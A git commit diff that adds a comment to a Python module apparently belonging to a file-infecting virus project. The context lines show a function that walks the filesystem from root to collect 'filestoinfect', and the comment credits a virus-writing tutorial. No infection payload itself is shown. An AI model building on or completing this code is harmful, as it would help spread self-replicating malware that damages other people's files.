5ffa0fed62fa9c86328c770b362760ab0a8f2442
addict1 <tristan_charpentier@hotmail.com>
2015-05-05 14:15:54 -0400

    Added debug help

--- modules/i_0.0.1.py
+++ modules/i_0.0.1.py
@@ -14,3 +14,14 @@ def search(path):
     return filestoinfect
 	
 search("/")
+
+"""
+The various variables present for your sake of moduability are 
+"filestoinfect" which is an array of all files that fit the 
+requirement. In this case that is only in python although 
+later on, support for more languages will be added.
+
+This subsection contains code from 
+https://cranklin.wordpress.com/2012/05/10/how-to-make-a-simple-computer-virus-with-python/
+without their consent. But he or she is due some respect.
+"""
